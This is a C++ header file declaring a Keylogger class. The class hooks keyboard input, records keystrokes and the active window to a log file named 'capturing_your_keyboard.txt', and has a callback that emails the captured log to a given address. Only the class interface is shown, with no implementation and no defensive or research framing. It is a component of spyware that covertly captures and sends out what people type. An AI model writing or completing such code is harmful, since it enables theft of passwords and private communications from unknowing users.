#pragma once

#include "EmailService.h"
#include "Hook.h"

#include <fstream>
#include <vector>
#include <Psapi.h>
#include <string>
#include <memory>

using namespace std;

class Keylogger {
public:
	void start();
	void stop();
	~Keylogger();

	bool sendEmailCallback(std::string emailTo);
private:
	const int memoryBufferSize = 10;
	const wstring FILENAME = L"capturing_your_keyboard.txt";
	Hook* hook;
	ofstream logFile;
	HWND lastActiveWindow;

	void keyboardHandler(wchar_t* key);

	static char charBuffer[1024];
	static string wcharToStr(wchar_t* str);
};

